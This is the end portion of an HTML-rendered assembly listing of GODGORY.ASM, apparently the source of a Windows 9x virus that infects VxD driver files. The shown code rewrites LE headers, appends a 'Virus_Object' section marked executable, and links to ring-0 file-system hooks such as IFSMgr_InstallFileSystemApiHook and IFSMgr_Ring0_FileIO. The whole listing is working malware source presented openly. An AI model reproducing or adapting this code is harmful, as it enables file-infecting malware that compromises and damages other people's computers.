                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,(</span><span class="sc5">IMAGE_RLC_RINT</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)+</span><span class="sc5">IMAGE_RLC_ST_SOFF32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.FR_stype</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_objcnt</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.FR_fixup.FH_obj</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.FR_fixup.FH_offset</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_objcnt</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc5">Update_LE_Fail</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Move LE info data forward and fix the appropriate LE header pointers</span><span class="sc0">
</span><span class="sc1">;ş On entry:</span><span class="sc0">
</span><span class="sc1">;  EAX=Starting offset (relative to the beginning of the LE header)</span><span class="sc0">
</span><span class="sc1">;  EBX=Number of bytes to move</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to LE header</span><span class="sc0">
</span><span class="sc1">;  LE_Info_Mem=Pointer to LE info (allocated memory)</span><span class="sc0">
</span><span class="sc1">;  LE_Info_Size=Size of LE info</span><span class="sc0">
</span><span class="sc1">;ş On exit:</span><span class="sc0">
</span><span class="sc1">;  EAX=Address (in memory) of entry EAX</span><span class="sc0">
</span><span class="sc1">;  LE header updated</span><span class="sc0">
</span><span class="sc1">;  LE info updated</span><span class="sc0">
</span><span class="sc5">Move_Data</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Fix_Pointers</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_VXD_HEADER</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_Size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_Mem</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">std</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;Move data</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0"> </span><span class="sc1">;Restore direction flag for the VMM!</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Recalc</span><span class="sc0">

</span><span class="sc1">;Get "object table" address (first object)</span><span class="sc0">
</span><span class="sc1">;ş On entry:</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to LE header</span><span class="sc0">
</span><span class="sc1">;  LE_Info_Mem=Pointer to LE info (allocated memory)</span><span class="sc0">
</span><span class="sc1">;ş On exit:</span><span class="sc0">
</span><span class="sc1">;  EAX=Pointer to "object table"</span><span class="sc0">
</span><span class="sc5">Get_Object_Table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_objtab</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Recalc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_VXD_HEADER</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_Mem</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Fix LE header pointers (resident), that follow the "object table"</span><span class="sc0">
</span><span class="sc1">;ş On entry:</span><span class="sc0">
</span><span class="sc1">;  EAX=Starting offset (relative to the beginning of the LE header)</span><span class="sc0">
</span><span class="sc1">;  EBX=Number of bytes to add to pointer (if pointeròEAX)</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to LE header</span><span class="sc0">
</span><span class="sc1">;ş On exit:</span><span class="sc0">
</span><span class="sc1">;  EDX=?</span><span class="sc0">
</span><span class="sc1">;  LE header updated</span><span class="sc0">
</span><span class="sc5">Fix_Pointers</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.LE_objmap</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Adjust_Pointer</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.LE_restab</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Adjust_Pointer</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.LE_enttab</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Adjust_Pointer</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.LE_fpagetab</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Adjust_Pointer</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.LE_frectab</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Adjust_Pointer</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.LE_impmod</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Adjust_Pointer</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.LE_impproc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc1">;call Adjust_Pointer</span><span class="sc0">
                </span><span class="sc1">;ret</span><span class="sc0">

</span><span class="sc5">Adjust_Pointer</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">Adjust_Pointer_Exit</span><span class="sc0"> </span><span class="sc1">;Check for 0 and lower pointer</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">Adjust_Pointer_Exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Fix dynamic links</span><span class="sc0">
</span><span class="sc5">Fix_Dynamic_Links</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc5">Dyna_Link_Int</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">Dynamic_Link1</span><span class="sc4">-</span><span class="sc5">Start_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">@@Test_Debug_Installed</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">Dynamic_Link2</span><span class="sc4">-</span><span class="sc5">Start_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">@@Hook_Device_Service</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">Dynamic_Link3</span><span class="sc4">-</span><span class="sc5">Start_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">@@_HeapAllocate</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">Dynamic_Link4</span><span class="sc4">-</span><span class="sc5">Start_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">@@_HeapFree</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">Dynamic_Link5</span><span class="sc4">-</span><span class="sc5">Start_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">@@IFSMgr_InstallFileSystemApiHook</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">Dynamic_Link6</span><span class="sc4">-</span><span class="sc5">Start_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">@@UniToBCSPath</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">Dynamic_Link7</span><span class="sc4">-</span><span class="sc5">Start_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">@@IFSMgr_Ring0_FileIO</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">My_HeapAllocate</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;Flags</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;Size (in bytes)</span><span class="sc0">
</span><span class="sc5">Dynamic_Link3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">_HeapAllocate</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">My_HeapFree</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;Flags</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;Address of block</span><span class="sc0">
</span><span class="sc5">Dynamic_Link4</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">_HeapFree</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;File input/output</span><span class="sc0">
</span><span class="sc5">FileIO_Write</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Simulate_FileIO</span><span class="sc0">
</span><span class="sc5">FileIO_Read</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_READFILE</span><span class="sc0">
</span><span class="sc5">Simulate_FileIO</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">File_Handle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Original_FileIO</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Dynamic_Link7</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Virus_Object</span><span class="sc0">    </span><span class="sc5">IMAGE_OBJECT_HEADER</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Virus_Physical_Size</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">IMAGE_OBJ_READ\
</span><span class="sc0">                </span><span class="sc4">+</span><span class="sc5">IMAGE_OBJ_WRITE</span><span class="sc4">+</span><span class="sc5">IMAGE_OBJ_EXEC</span><span class="sc4">+</span><span class="sc5">IMAGE_OBJ_DISCARD</span><span class="sc4">+</span><span class="sc5">IMAGE_OBJ_BIGDEF</span><span class="sc4">,,\
</span><span class="sc0">                </span><span class="sc4">,</span><span class="sc3">"NROH"</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">Virus_Physical_End</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">File_Buffer</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">IMAGE_VXD_HEADER</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">DDB_Buffer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">VxD_Desc_Block</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Virus_Virtual_End</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">VxD_CODE_ENDS</span><span class="sc0">

                </span><span class="sc9">end</span><span class="sc0">
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´ </span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">GODGORY.ASM</span><span class="sc0"> ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
</span></div></body>
</html>
